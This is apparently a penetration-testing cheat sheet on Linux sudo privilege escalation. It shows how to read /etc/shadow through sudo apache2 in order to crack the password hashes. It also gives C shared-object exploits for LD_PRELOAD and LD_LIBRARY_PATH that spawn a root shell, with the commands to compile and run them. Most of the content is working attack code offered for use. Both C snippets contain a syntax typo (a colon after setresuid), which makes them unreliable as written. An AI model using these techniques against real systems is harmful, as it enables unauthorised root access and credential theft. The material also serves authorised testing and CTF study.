# Sudo

```bash
sudo -l
```

## Apache

Use apache2 to read /etc/shadow file:

```bash
/usr/bin/apache2

$ sudo apache2 -f /etc/shadow
Copy the hash and crack it.
```

## Environment Variable

```bash
$ sudo -l
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

### LD_PRELOAD

Create the exploit:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0):
	system("/bin/bash -p");
}
```

Compile:

```c
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Run any allowed program using sudo and the shared object created:

```bash
sudo LD_PRELOAD=/tmp/preload.so find
```

### LD_LIBRARY_PATH

Select one shared object to replace (one that sudo can run):

```bash
$ ldd /usr/sbin/apache2
...
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
```

Create the exploit:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0):
	system("/bin/bash -p");
}
```

Compile:

```bash
gcc -fPIC -shared -nostartfiles -o libcrypt.so.1 library_path.c
```

Run any allowed program using sudo and the shared object created:

```bash
sudo LD_LIBRARY_PATH=. apache2
```